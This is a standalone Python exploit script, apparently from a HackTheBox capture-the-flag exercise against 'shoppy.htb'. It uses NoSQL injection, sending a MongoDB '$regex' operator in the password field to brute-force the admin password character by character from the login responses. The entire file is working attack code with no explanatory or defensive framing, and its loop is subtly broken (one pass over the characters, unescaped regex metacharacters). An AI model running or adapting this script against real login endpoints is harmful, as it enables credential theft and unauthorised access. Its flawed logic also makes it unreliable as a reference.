#!/usr/bin/env python3

import requests
import string

url = "http://shoppy.htb/"
path = "login"

def main():
	characters = string.printable
	username = "admin"
	password = ""

	for c in characters:
		payload='{"username": "admin", "password": {"$regex": "^%s" } }' % (password + c)
		print(payload)
		print(f'Trying: username: {username} and password: {password + c}')

		r = requests.post(url + path, data=payload, verify=False, allow_redirects=False)

		if "WrongCredentials" in r.text or r.status_code == 400:
			print(f'{password + c}, Failed, going next char..')
		else:
			print(f'{password + c} Worked, going next char...')
			password += c


if __name__ == "__main__":
	try:
		main()
	except KeyboardInterrupt:
		print("[!] Bye")
		exit()
